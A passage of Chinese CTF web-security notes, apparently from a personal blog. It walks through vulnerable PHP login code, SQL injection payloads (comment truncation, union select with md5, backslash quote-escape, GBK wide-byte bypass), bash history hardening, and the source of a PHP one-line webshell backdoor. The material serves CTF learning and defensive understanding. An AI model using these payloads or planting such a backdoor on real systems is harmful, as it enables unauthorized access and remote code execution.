(pw='".$pass."')"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user]; 分析：会对传入参数两端去空格，然后sql拼接如下 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; 所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。 MySQL主要有三种注释方式： 注释方式 说明 # 注释到行尾 /*内容*/ 用于行间或多行注释（也可用/**/代替空格） – 也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等（’ or 1=1– ） 解法：本题可post：user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123 sql语句就变成select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;) 查询语句就能成功返回user列，值为admin的那条记录。 union查询源码： 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query("select pw from ctf where user='$user'")); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo "&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;"; &#125; else &#123; echo("&lt;p&gt;Log in failure!&lt;/p&gt;"); &#125;&#125;?&gt; 解法：关键点在源代码第7、8行。首先要观察，我们能够控制的查询结果有$query[pw]的值，通过让union前的查询语句为空，查询结果由union后面的语句控制即可。 例如：select pw from ctf where user=&#39;-1&#39; union select &#39;mytest&#39;这样查询结果pw就是’mytest’这个字符串了。再看那个if语句，只看后面的判断，实际上只要输入的和查询的结果一致就行了。 注意别忘记输入pass后，会对其进行MD5加密。所以构造post：user=&#39; union select md5(&#39;suqir&#39;)#&amp;pass=suqir查询语句就变为SELECT * FROM users WHERE name=&#39;admin&#39; AND pass=&#39;pass&#39;; 转义源码： 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag;--&gt; 分析：这题的clean函数用来过滤引号，会将其转化为实体编码，所以我们没有办法直接用引号来闭合了，只能运用转义字符来吃掉后面的那个单引号了，即构造username=suqir\&amp;password=or%201%23使得查询语句如下 SELECT * FROM users WHERE name=&#39;suqir\&#39;&#39; AND pass=&#39;or%201%23&#39; 即 123456SELECT * FROM users WHERE name='suqir\' AND pass=' 『 [name]的值为 [' AND pass=] ，显然逻辑值为false 』or 1 『 但没关系，[false or 1] 的逻辑值为真』 #' 『 注释掉多余的单引号 』即select * from users where false or 1 一道综合题:南邮CTF-综合题2及其writeup GBK宽字节编码漏洞(gbk_sql_injection)介绍：php中MYSQL数据库,如果是GBK编码.一定要小心GBK宽字节编码漏洞正常情况下 magic_quote_gpc 为ON,如果输入 http://www.xxxx.com/index.php?user=11′ and 1=2 # SQL语句就会变成 SELECT * FROM user WHERE user=’1\’ and 1=2 #’ 自动加上了\转义，如果构造特殊的宽字节编码呢？ http://www.xxxx.com/index.php?user=11%df%27 and 1=2 # SQL语句就变成 SELECT * FROM user WHERE user=’11運’ and 1=2#’ 这样就注入上了！ 11%df会被解析成11運,而%27被邪恶的解析成&#39;就绕过了gpc转义,就成功构造注入了 Unix/Linux相关bash_historyBash shell在~/.bash_history（~/表示用户目录）文件中保存了500条使用过的命令，这样可以使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个.bash_history文件。 为了安全，bash shell应该保存少量的命令，并且在每次用户注销时都把这些历史命令删除。 删除方法: 第一步：/etc/profile文件中的HISTFILESIZE和HISTSIZE行确定所有用户的.bash_history文件中可以保存的旧命令条数。强烈建议把把/etc/profile文件中的HISTFILESIZE和HISTSIZE行的值设为一个较小的数，比如30。编辑profile文件vi /etc/profile，把下面这行改为： 12HISTFILESIZE=30HISTSIZE=30 这表示每个用户的.bash_history文件只可以保存30条旧命令。 第二步：网管还应该在/etc/skel/.bash_logout文件中添加下面这行rm -f $HOME/.bash_history。这样，当用户每次注销时.bash_history文件都会被删除. vi编辑器的备份文件linux下一般使用vi编辑器，并且异常退出会留下备份文件xxx.swp 一句话木马数组回调后门源码： 12345&lt;?php$e = $_REQUEST['www'];$arr = array($_POST['wtf'] =&gt; '|.*|e',);array_walk($arr, $e, '');?&gt; 分析：利用了php中回调函数的后门，可以使www为preg_replace函数，当array_walk()将函数作用于数组时，POST传入的数据作为preg_replace()的第二个参数，在替换后被当做 php 代码执行（在php5.3下可用，5.5后preg_replace函数已弃用了使替换后的字符串作为php代码执行的/e修饰符）。 测试： 未完待续。。。]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
</search>
